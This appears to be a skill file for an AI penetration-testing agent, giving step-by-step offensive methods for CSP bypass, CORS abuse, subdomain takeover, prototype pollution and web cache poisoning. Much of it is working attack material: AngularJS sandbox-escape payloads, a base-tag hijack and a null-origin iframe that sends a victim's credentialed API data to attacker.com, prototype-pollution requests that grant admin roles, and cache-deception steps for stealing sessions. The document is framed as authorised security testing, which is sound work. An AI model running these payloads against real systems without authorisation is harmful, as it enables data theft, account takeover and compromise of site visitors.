---
name: web-security-advanced
description: "Advanced web security testing: CSP bypass, CORS, subdomain takeover, cache poisoning, prototype pollution"
category: specialized
tier: powerful
contextBoosts: [api]
toolRefs: [httpRequest, parseResponse, evaluateRendered, findEndpointsInResponse, followRedirects, updateGraph, writeFinding, encodeDecode, getCapturedHeaders]
triggers: ["advanced web security", "csp bypass", "cors testing", "subdomain takeover", "cache poisoning", "prototype pollution", "http security headers", "content security policy", "advanced web testing", "security configuration"]
mitreAttack: ["T1190", "T1046", "T1189"]
owaspRefs: ["OWASP Top 10 A05:2021 Security Misconfiguration"]
---

# Advanced Web Security — Payload-Driven Testing

## When to Use
- Target has security headers worth analyzing (CSP, HSTS, X-Frame-Options)
- You need to escalate from reflected XSS to full policy bypass
- CORS headers are present and may be misconfigured
- Subdomains exist that might point to decommissioned services
- Application uses client-side JavaScript frameworks vulnerable to prototype pollution
- CDN or caching layer sits in front of the application

## Do Not Use
- Initial recon phase — use `recon` skill first
- Authentication bypass testing — use `authorization` skill
- Business logic flaws — use `business-logic` skill
- Simple reflected/stored XSS without CSP context — use `vuln-discovery` skill

## Auth Context
Record all authenticated vs unauthenticated differences. Many CSP and CORS configurations change based on authentication state. Test every technique with and without cookies/tokens when the target has login-gated areas. Document which headers appear only in authenticated responses.

---

## 1. CSP Bypass

### Step 1 — Extract and Parse CSP

```bash
curl -sI "https://target.com" | grep -i "content-security-policy"
```

Parse every directive. Log: `script-src`, `style-src`, `img-src`, `connect-src`, `frame-src`, `object-src`, `base-uri`, `form-action`, `upgrade-insecure-requests`.

### Step 2 — Identify Allowed Origins

```
For each origin in script-src:
  1. Is it a CDN (cdnjs, jsdelivr, unpkg, bootstrapcdn)?
  2. Is it self with a subdomain wildcard ( *.target.com )?
  3. Is it a third-party SaaS (googleapis, gstatic, cloudflare)?
  4. Does it allow data: or blob: schemes?
  5. Is nonce or hash-based?
```

### Step 3 — Test Specific Bypasses

**A. JSONP Endpoint on Allowed Origin**

```bash
curl -s "https://allowed-origin.com/path?callback=alert" | head -5
# If response starts with alert( — JSONP is available
```

```python
import requests
allowed_origins = ["https://cdn.target.com", "https://apis.google.com"]
for origin in allowed_origins:
    r = requests.get(f"{origin}/search?q=xss&callback=alert", timeout=10)
    if "alert(" in r.text[:200]:
        print(f"JSONP bypass on {origin}")
```

**B. Angular JS Template Injection (if angular in script-src)**

```html
<script src="https://allowed-origin.com/angular.min.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```

Test with version-specific payloads:
- Angular 1.2.19: `{{'a'.constructor.prototype.push=[].join;$eval('x=alert(1)');}}`
- Angular 1.4.0-1.4.9: `{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}`

**C. Base Tag Hijack (base-uri: self)**

```bash
# If base-uri is missing or allows self, inject a base tag pointing to attacker-controlled host
```

```html
<base href="https://attacker.com/">
<!-- All relative script src now load from attacker.com -->
<script src="/payload.js"></script>
```

**D. data: URI in script-src (even with nonce)**

```html
<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>
<!-- Works if script-src includes data: (bypasses nonce) -->
```

**E. Webpack Dev Server / Source Maps**

```bash
curl -s "https://target.com/static/js/bundle.js.map" | python3 -c "
import json,sys
d=json.load(sys.stdin)
for s in d.get('sources',[]):
    print(s)
"
```

**F. DOM Clobbering to Bypass script-src**

```html
<a id="cdn"><a id="cdn" name="https://attacker.com/">
<!-- If CSP uses dynamic src from element properties, this clobbers the URL -->
```

### Decision Tree — CSP Response

```
CSP header present?
├─ NO → Missing header finding (Medium severity)
├─ YES → Analyze each directive
│   ├─ script-src includes 'unsafe-inline' → XSS trivially exploitable
│   ├─ script-src includes 'unsafe-eval' → eval-based XSS
│   ├─ script-src allows *.s3.amazonaws.com → Test for hosted JS on S3
│   ├─ script-src allows cdn.jsdelivr.net → Test JSONP endpoints
│   ├─ script-src allows googleapis.com → Test for JSONP in API responses
│   ├─ script-src with nonce only → Test for nonce exfil via CSS (font-family)
│   ├─ base-uri missing → Inject <base> tag
│   ├─ object-src missing → Flash/Java plugin injection
│   └─ All others strict → Report CSP is effective, move on
```

---

## 2. CORS Misconfiguration

### Step 1 — Baseline Reflection Test

```bash
curl -sI -H "Origin: https://evil.com" "https://target.com/api/userinfo" \
  | grep -i "access-control"
```

### Step 2 — Full Origin Matrix

```python
import requests

target = "https://target.com/api/userinfo"
origins = [
    "https://evil.com",
    "null",
    "https://target.com.evil.com",
    "https://evil-target.com",
    "https://sub.target.com",
    "https://TARGET.COM",       # uppercase
    "https://target.com%60.com",# backtick trick
    "https://target.com%0d%0aevil.com",
    "https://target.com:443",
    "https://target.com:80",
    "https://attacker.com?target.com",
    "https://target.com.attacker.com",
]

for origin in origins:
    r = requests.get(target, headers={"Origin": origin}, cookies={"session": "test"})
    acao = r.headers.get("Access-Control-Allow-Origin", "")
    acac = r.headers.get("Access-Control-Allow-Credentials", "")
    if acao:
        print(f"Origin: {origin} → ACAO: {acao} | ACAC: {acac}")
        if acac.lower() == "true":
            print(f"  [!] CREDENTIALS REFLECTED — full account takeover possible")
```

### Step 3 — Preflight Bypass

```bash
curl -sI -X OPTIONS -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: DELETE" \
  -H "Access-Control-Request-Headers: Authorization" \
  "https://target.com/api/resource"
```

### Step 4 — Null Origin Test

```html
<iframe sandbox="allow-scripts" src="data:text/html,<script>
fetch('https://target.com/api/userinfo',{credentials:'include'})
  .then(r=>r.json())
  .then(d=>location='https://attacker.com/?data='+JSON.stringify(d))
</script>"></iframe>
```

### Decision Tree — CORS Response

```
Access-Control-Allow-Origin reflected?
├─ YES + Credentials: true → CRITICAL — Cookie-bearing cross-origin reads
│   ├─ Origin: null works → Even easier exploit (iframe sandbox)
│   ├─ Only specific origins → Test subdomain/uppercase/percent-encoding tricks
│   └─ Any origin → Wildcard with credentials (browsers block, but check legacy)
├─ YES + No credentials → Potential for reading public data cross-origin
├─ Only preflight reflects → Test non-preflight methods (GET, POST with simple headers)
├─ ACAO: * present → Browser blocks with credentials, but may leak in non-browser contexts
└─ No ACAO header → CORS is restrictive, move on
```

---

## 3. Subdomain Takeover

### Step 1 — Subdomain Enumeration

```bash
# Amass/Subfinder enum
amass enum -d target.com -o subs.txt
subfinder -d target.com -o subs.txt

# DNS resolution check
cat subs.txt | httpx -silent -status-code -title -tech-detect > alive.txt
```

### Step 2 — Identify Dangling CNAME Records

```python
import dns.resolver

def check_dangling(subdomain):
    try:
        answers = dns.resolver.resolve(subdomain, 'CNAME')
        for rdata in answers:
            cname = str(rdata.target).rstrip('.')
            services = {
                "s3.amazonaws.com": "AWS S3",
                "github.io": "GitHub Pages",
                "herokudns.com": "Heroku",
                "herokuapp.com": "Heroku",
                "azurewebsites.net": "Azure",
                "cloudapp.azure.com": "Azure",
                "trafficmanager.net": "Azure",
                "blob.core.windows.net": "Azure",
                "amazonaws.com": "AWS (generic)",
                "shopify.com": "Shopify",
                "fastly.net": "Fastly",
                "pantheon.io": "Pantheon",
                "ghost.io": "Ghost",
                "surge.sh": "Surge",
                "bitbucket.io": "Bitbucket",
                "zendesk.com": "Zendesk",
                "readme.io": "ReadMe",
                "ghost.io": "Ghost",
                "helpjuice.com": "HelpJuice",
                "helpscoutdocs.com": "HelpScout",
                "statuspage.io": "Atlassian StatusPage",
                "pingdom.com": "Pingdom",
                "tictail.com": "Tictail",
                "campaignmonitor.com": "Campaign Monitor",
                "cargocollective.com": "Cargo Collective",
                "feedpress.com": "FeedPress",
                "ghost.io": "Ghost",
                "helpjuice.com": "HelpJuice",
                "helpscoutdocs.com": "Help Scout",
                "heroku.com": "Heroku",
                "herokussl.com": "Heroku SSL",
                "hivedesk.com": "HiveDesk",
                "landingi.com": "Landingi",
                "launchrock.com": "LaunchRock",
                "ngrok.io": "ngrok",
                "pingdom.com": "Pingdom",
                "proposify.biz": "Proposify",
                "readme.io": "ReadMe",
                "simplebooklet.com": "SimpleBooklet",
                "smartling.com": "Smartling",
                "statuspage.io": "Statuspage.io",
                "strikingly.com": "Strikingly",
                "surge.sh": "Surge",
                "tave.com": "Tave",
                "tictail.com": "Tictail",
                "tumblr.com": "Tumblr",
                "uberflip.com": "Uberflip",
                "unbounce.com": "Unbounce",
                "uservoice.com": "UserVoice",
                "vend.com": "Vend",
                "webflow.com": "Webflow",
                "wishpond.com": "Wishpond",
                "wordpress.com": "WordPress",
                "zendesk.com": "Zendesk",
                "zoho.com": "Zoho",
            }
            for pattern, service in services.items():
                if pattern in cname:
                    return subdomain, cname, service
        return None
    except Exception:
        return None

import concurrent.futures
with open("subs.txt") as f:
    subs = [l.strip() for l in f]
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as exe:
    results = list(exe.map(check_dangling, subs))
for r in results:
    if r:
        print(f"[POTENTIAL] {r[0]} → CNAME {r[1]} → Service: {r[2]}")
```

### Step 3 — Verify Takeover

```bash
# Check HTTP response for unclaimed resource indicators
curl -sI "https://dangling.target.com" | head -20
# Look for: 404 with service branding, "NoSuchBucket", "Repository not found"

# S3 Bucket takeover test
curl -s "https://dangling.target.com.s3.amazonaws.com/"
# Response: "NoSuchBucket" or "AccessDenied" = takeable

# GitHub Pages test
curl -s "https://dangling.target.com" | grep -i "there isn't a github pages site here"
```

### Step 4 — Claim and Exploit

```bash
# For S3: Create bucket with same name
aws s3 mb s3://dangling-target-com

# For GitHub: Create repo named dangling-target-com
# Then create CNAME file in repo root with target subdomain
```

### Decision Tree — Subdomain Status

```
CNAME exists?
├─ YES → Check pointed-to service
│   ├─ S3 bucket returns NoSuchBucket → TAKEOVER VIA S3
│   ├─ GitHub Pages "repo not found" → TAKEOVER VIA GH PAGES
│   ├─ Heroku "no such app" → TAKEOVER VIA HEROKU
│   ├─ Azure 404 with Azure branding → TAKEOVER VIA AZURE
│   ├─ Service responds normally → Not vulnerable, but document trust relationship
│   └─ No CNAME → Check A/AAAA records, may be parked
├─ NO → NXDOMAIN returned → Subdomain not in DNS, not exploitable
└─ Wildcard DNS (*.target.com) → Cannot takeover, but wildcard scope matters
```

---

## 4. Prototype Pollution

### Step 1 — Identify Client-Side Libraries

```bash
# Extract JavaScript sources
curl -s "https://target.com" | grep -oP 'src="[^"]*\.js[^"]*"' | sort -u

# Check for vulnerable patterns
curl -s "https://target.com" | grep -oP '(merge|extend|assign|deepMerge|defaultsDeep|clone|extendDeep)\s*\('
```

### Step 2 — Common Vulnerable Libraries

```
jQuery < 3.4.0   — $.extend(true, ...) with user-controlled key
Lodash < 4.17.12 — _.merge, _.set, _.defaultsDeep
Node.js < 8.12.0 — Object.assign with __proto__
Webpack-dev-server — client-side HMR injection
AngularJS < 1.6.0 — $routeProvider / template injection
Mootools < 1.6.0  — Object.append, Object.merge
Prototype.js < 1.7 — Object.extend
```

### Step 3 — Payload Delivery via URL Parameters

```bash
# Test if URL params reach client-side merge functions
curl -s "https://target.com/page?__proto__[test]=polluted" | grep "polluted"

# Test with JSON body injection
curl -s -X POST "https://target.com/api/config" \
  -H "Content-Type: application/json" \
  -d '{"options":{"__proto__":{"isAdmin":true}}}'
```

### Step 4 — Exploitation Payloads

**A. Client-Side XSS via Constructor Override**

```javascript
// If site uses _.defaultsDeep or similar with URL params
?__proto__[innerHTML]=<img/src/onerror=alert(1)>
?__proto__[src]=data:text/javascript,alert(1)
?__proto__[onload]=alert(1)

// jQuery extend
?__proto__[css]=alert(1)// (jQuery < 3.4 uses eval in css hook)
```

**B. Server-Side Privilege Escalation**

```bash
# If Node.js server merges user input with defaults
curl -s -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","__proto__":{"role":"admin","isAdmin":true}}'
```

**C. DOM Clobbering Chain (Modern)**

```html
<form id=payload>
  <input name=__proto__.isAdmin value=true>
</form>
<script>
// If site uses structuredClone or JSON.parse + merge
// with user-controlled form data
</script>
```

**D. Webpack HMR Poisoning**

```bash
# If webpack-dev-server is exposed in production
curl -s "https://target.com/sockjs-node/info"
curl -s "https://target.com/__webpack_hmr"
# HMR allows arbitrary module replacement in dev mode
```

### Decision Tree — Pollution Impact

```
Can you inject __proto__ or constructor into merge/extend call?
├─ YES → What properties reach client DOM?
│   ├─ innerHTML, outerHTML, src, href, action → XSS
│   ├─ dataset, className → CSS injection / attribute injection
│   └─ event handlers (onclick, onerror) → Direct XSS
├─ YES → Does server merge your input into user objects?
│   ├─ role, isAdmin, permissions → Privilege escalation
│   ├─ email, password fields → Account takeover
│   └─ No sensitive fields → Limited impact, but report
├─ NO → Test other merge points (form data, query params, cookies)
└─ UNSURE → Test with `console.log(JSON.stringify({}.__proto__))` in browser console
```

---

## 5. Web Cache Poisoning

### Step 1 — Identify Unkeyed Inputs

```bash
# Test which headers are cached but not part of cache key
curl -sI -H "X-Forwarded-Host: evil.com" "https://target.com/page" \
  | grep -i "x-cache\|age\|via\|cf-cache"

# Test multiple times to confirm caching behavior
for i in {1..5}; do
  curl -sI -H "X-Forwarded-Host: evil.com" "https://target.com/page" \
    | grep -i "x-cache"
done
```

### Step 2 — Test Unkeyed Headers

```python
import requests
import time

target = "https://target.com/page"
unkeyed_headers = [
    "X-Forwarded-Host",
    "X-Forwarded-Proto",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Host",
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Client-IP",
    "True-Client-IP",
    "Forwarded",
    "X-HTTP-Method-Override",
    "X-HTTP-Host-Override",
    "X-Forwarded-Server",
    "X-Host-Header",
]

for header in unkeyed_headers:
    # First request: poison with malicious header
    r1 = requests.get(target, headers={header: "evil.com"})
    # Second request: normal, check if poisoned response is served
    r2 = requests.get(target)
    if "evil.com" in r2.text:
        print(f"[POISONABLE] {header}")
        print(f"  Poisoned response snippet: {r2.text[:200]}")
```

### Step 3 — Exploit Cache Poisoning

**A. XSS via Unkeyed Host Header (Cache Poison → XSS)**

```bash
# Step 1: Poison cache with reflected host in JavaScript
curl -sI -H "X-Forwarded-Host: evil.com" "https://target.com/page" | grep x-cache

# If target reflects X-Forwarded-Host in <script src> or inline JS:
# <script>var host = "evil.com"</script>

# Step 2: Craft exploit
# Poison: inject <script src="https://evil.com/payload.js">
# Any visitor to /page loads the poisoned cached response
```

**B. Cache Poisoning to Open Redirect**

```bash
# If X-Forwarded-Host is reflected in redirect location:
curl -sI -H "X-Forwarded-Host: evil.com" "https://target.com/redirect"
# Response: Location: https://evil.com/

# This enables OAuth token theft if target has SSO
```

**C. Cache Deception**

```bash
# Test if cache stores authenticated responses for public URLs
# Append cache extensions to authenticated endpoints:
curl -s -b "session=VALID_SESSION" "https://target.com/account/profile.css"
curl -s -b "session=VALID_SESSION" "https://target.com/account/profile.js"
curl -s -b "session=VALID_SESSION" "https://target.com/account/profile.ico"
curl -s -b "session=VALID_SESSION" "https://target.com/account/profile.jpg"

# If cache serves these with valid session data → Cache Deception
# Then share URL to steal victim's session
```

**D. Vary Header Bypass**

```bash
# If cache ignores User-Agent in Vary header:
curl -s -H "User-Agent: Googlebot" "https://target.com/page" | head -10
# Server may return different content for bots (cloaking)
# Poison cache with bot response, serve to normal users
```

### Decision Tree — Cache Poisoning

```
Does the response vary on an unkeyed input?
├─ YES → What content is reflected?
│   ├─ JavaScript URLs → XSS via poisoned script src
│   ├─ Redirect locations → Open redirect → OAuth theft
│   ├─ HTML content → Inject arbitrary markup
│   └─ JSON API responses → Poison API cache for data exfil
├─ NO VARY header → Test all unkeyed headers systematically
├─ Cache status headers present but not exploitable → Document, low priority
└─ CDN-specific behavior:
    ├─ Cloudflare: Test cf-cache-status, X-FL, CF-Connecting-IP
    ├─ Fastly: Test X-Cache, X-Served-By, X-Timer
    ├─ Akamai: Test X-Cache, X-True-Cache-Key, Pragma
    └─ Varnish: Test X-Varnish, Via, Age
```

---

## Anti-Hallucination

- Every CSP bypass claim must include the full CSP header and the specific origin being exploited
- Every CORS finding must include the exact ACAO header value and whether ACAC: true was present
- Every subdomain takeover must show the dangling CNAME and the service response (not just DNS record)
- Every prototype pollution must include the vulnerable merge/extend call site in the actual JavaScript
- Every cache poisoning must show two consecutive requests: one poisoning, one confirming cached poison
- Never claim a service is "vulnerable to takeover" without verifying the service returns a claimable state
- Never claim CSP is "bypassable" without demonstrating the specific payload loading in the policy context
- Never claim CORS allows cross-origin reads without testing with credentials included
